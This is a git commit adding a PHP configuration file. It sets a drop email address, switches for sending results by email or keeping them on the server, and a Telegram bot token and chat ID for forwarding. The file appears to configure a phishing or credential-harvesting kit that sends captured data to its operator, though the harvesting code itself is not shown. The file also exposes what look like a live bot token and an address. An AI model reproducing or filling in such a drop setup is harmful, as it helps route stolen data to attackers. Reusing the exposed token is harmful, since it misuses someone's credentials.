1237d16fbe22405ec608fae130e5a2dde660d261
cvicle <106643496+cvicle@users.noreply.github.com>
2022-06-01 00:19:03 -0500

    Add files via upload

---
+++ configure.php
@@ -0,0 +1,20 @@
+<?php
+/*
+*** Set your email below and configure functions to your requirments ***
+*** FUNCTION CONTROL: 1=ON  and 0=OFF ***
+EXAMPLE
+$Example=1;  // Function On
+$Example=0;  // Function Off
+*/
+$youremail='jacvbghyujkiolpwemk675@gmail.com';  // Set your email
+$Send_to_Email='1';
+$Save_on_Server='0';
+/*
+*/
+$Send_to_Telegram='1';
+$token='5252132779:AAHUEJBawGkG95uSg2BYVOOIzCTTlnxxem8';
+$chat_id= "1088205830";
+
+/*
+*/
+?>
